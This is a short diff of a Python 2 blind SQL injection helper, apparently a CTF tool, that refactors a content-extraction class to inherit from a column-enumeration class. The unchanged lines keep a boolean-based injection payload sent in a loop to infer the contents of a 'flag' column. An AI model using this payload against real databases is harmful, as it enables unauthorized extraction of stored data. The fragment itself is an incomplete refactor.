@@ -1,15 +1,18 @@
 #!/usr/bin/env python
 # -*- coding:utf-8 -*-
 from lib.log import logger
+from columns import SqliColumns
 __author__ = "LoRexxar"
 
 
-class SqliContent:
+class SqliContent(SqliColumns):
     def __init__(self):
-        pass
+        SqliColumns.__init__(self)
+        if self.columns_name == 0:
+            SqliColumns.get_columns(self)
 
-    # 获取flag
-    def get_flag():
+    # 获取内容
+    def get_content(self, table_name, column_name):
         for i in xrange(130):
             payload = "f' or (select((SELECT COUNT(flag) from xxx limit 0,1) >" + repr(i) + "))#"
             whether = get_data(payload)
